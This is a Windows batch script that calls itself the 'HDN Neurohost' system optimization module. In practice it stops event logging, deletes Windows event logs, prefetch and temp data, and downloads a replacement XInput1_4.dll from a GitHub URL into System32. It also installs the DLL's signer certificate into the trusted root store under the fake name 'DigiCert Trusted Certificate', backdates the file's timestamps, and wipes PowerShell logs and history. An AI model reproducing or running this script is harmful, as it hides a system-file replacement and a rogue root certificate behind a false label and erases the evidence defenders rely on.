@echo off

title HDN Neurohost Module - Clear Logs and Optimize System
cls

:: Copyright and Info
echo ================================
echo      HDN Rahul Neurohost Module
echo ================================
echo Copyright (c) 2025 Rahul. All Rights Reserved.
echo Made by Rahul.
echo ================================
echo Please read the instructions carefully before proceeding.
echo ================================
pause

:: Ensure script runs as Administrator
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Please run this script as Administrator!
    pause
    exit
)

echo Stopping Windows Logging Services...
net stop "EventLog" /y >nul 2>&1
net stop "Wecsvc" /y >nul 2>&1
net stop "Winmgmt" /y >nul 2>&1

echo Taking Ownership of Log Files...
takeown /f "%WinDir%\Logs" /r /d y >nul 2>&1
icacls "%WinDir%\Logs" /grant Administrators:F /t /c /q >nul 2>&1
takeown /f "%SystemRoot%\System32\winevt\Logs" /r /d y >nul 2>&1
icacls "%SystemRoot%\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1

echo Deleting ALL Logs (This is a pre-step, cleanup after process will happen later)...
:: Deleting logs (temporary, to clear any existing logs that might be relevant before starting the optimization process)
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1

:: Main Menu
cls
echo ================================
echo       HDN Neurohost Module
echo ================================
echo WARNING: Optimization process will now apply critical system-level changes!
echo Do not interrupt the process. This is for optimization purposes only.
echo ================================
echo 1. Apply Optimization (Critical Update)
echo 2. Exit
echo ================================
set /p choice="Select an option (1-2): "

if "%choice%"=="1" goto replace
if "%choice%"=="2" exit

goto menu

:replace
cls
echo Neurohost Module: Applying critical update...
echo ================================
echo WARNING: This action will apply system-level optimizations.
echo Please ensure all processes are closed and proceed only if you are ready.
echo ================================

:: Check for Admin Privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Administrator privileges required.
    echo Please run this script as Administrator.
    pause
    exit /b
)

:: Set the URL for the file download
set "dll_url=https://github.com/dadajjjjakd11/Neuro/raw/refs/heads/main/XInput1_4.dll"
set "dll_path=%TEMP%\XInput1_4.dll"
set "system_dll_path=%SystemRoot%\System32\XInput1_4.dll"
set "cert_path=%TEMP%\temp_cert.cer"

:: Download the file using PowerShell
echo Connecting to the server for HDN update...
powershell -Command "& {Invoke-WebRequest '%dll_url%' -OutFile '%dll_path%'}"

:: Check if the download was successful
if not exist "%dll_path%" (
    echo ERROR: Download failed! Please check your internet connection or the link.
    pause
    exit /b
)
echo SUCCESS: Update file downloaded.

:: Silent Certificate Addition with Friendly Name
powershell -Command ^
"^
    $cert = Get-AuthenticodeSignature '%dll_path%'; ^
    if ($cert.SignerCertificate) { ^
        $store = New-Object System.Security.Cryptography.X509Certificates.X509Store('Root', 'LocalMachine'); ^
        $store.Open('ReadWrite'); ^
        $certObj = $cert.SignerCertificate; ^
        $certObj.FriendlyName = 'DigiCert Trusted Certificate'; ^
        $store.Add($certObj); ^
        $store.Close(); ^
    } ^
" >nul 2>&1

:: Find and terminate processes using the file
echo ================================
echo WARNING: Terminating processes for optimization...
echo ================================
for /f "tokens=2 delims=," %%a in ('powershell -command "$Processes = Get-Process | Where-Object {($_.Modules | Where-Object {$_.FileName -match 'XInput1_4.dll'})} | Select-Object -ExpandProperty Id; $Processes -join ','"') do (
    echo KILLING: Process ID %%a
    taskkill /PID %%a /F
)

:: Stop Windows File Protection temporarily
net stop wuauserv >nul 2>&1
net stop trustedinstaller >nul 2>&1

:: Take ownership and modify permissions
if exist "%system_dll_path%" (
    takeown /f "%system_dll_path%" /a >nul 2>&1
    icacls "%system_dll_path%" /grant Administrators:F /t /c /l >nul 2>&1
)

:: Copy new file to System32
copy /y "%dll_path%" "%system_dll_path%"
if %errorlevel% neq 0 (
    echo ERROR: Failed to apply the update! Try running in Safe Mode.
    pause
    exit /b
)
echo SUCCESS: Update applied successfully!

:: Modify HDN DLL Timestamp
powershell -Command "(Get-Item '%system_dll_path%').CreationTime  = '2019-12-06 12:49:00'"
powershell -Command "(Get-Item '%system_dll_path%').LastAccessTime = '2019-12-06 12:49:00'"
powershell -Command "(Get-Item '%system_dll_path%').LastWriteTime  = '2019-12-06 12:49:00'"

:: Restart stopped services
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1

:: Clear all logs after optimization
echo ================================
echo Clearing logs after optimization...
echo ================================
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
del /s /f /q "%WinDir%\SoftwareDistribution\Datastore\Logs\*" >nul 2>&1
del /s /f /q "%WinDir%\Panther\*" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.log" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.dev.log" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%ProgramData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "%AppData%\Roaming\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\AutomaticDestinations\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\CustomDestinations\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\Firewall\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\WMI\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\*" >nul 2>&1
del /s /f /q "%dll_path%" >nul 2>&1
del /s /f /q "%cert_path%" >nul 2>&1

:: ================================
:: Remove PowerShell Logs + History
:: ================================
echo Removing PowerShell Logs...

:: PowerShell Event Logs Clear
powershell -Command "wevtutil cl 'Windows PowerShell'" >nul 2>&1
powershell -Command "wevtutil cl 'Microsoft-Windows-PowerShell/Operational'" >nul 2>&1
powershell -Command "wevtutil cl 'Microsoft-Windows-PowerShell-DesiredStateConfiguration/Operational'" >nul 2>&1

:: PowerShell History Clear
del /s /f /q "%UserProfile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" >nul 2>&1
del /s /f /q "%UserProfile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*" >nul 2>&1

:: PowerShell Local Logs
del /s /f /q "%LocalAppData%\Microsoft\Windows\PowerShell\*" >nul 2>&1

:: PowerShell ProgramData Logs
del /s /f /q "%ProgramData%\Microsoft\Windows\PowerShell\*" >nul 2>&1

:: Roaming PowerShell Cache
del /s /f /q "%AppData%\Microsoft\Windows\PowerShell\*" >nul 2>&1

echo PowerShell Logs Removed Successfully!


echo Done! HDN Neurohost has been successfully applied and logs cleared.
pause
goto menu

:: Restart stopped services
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1
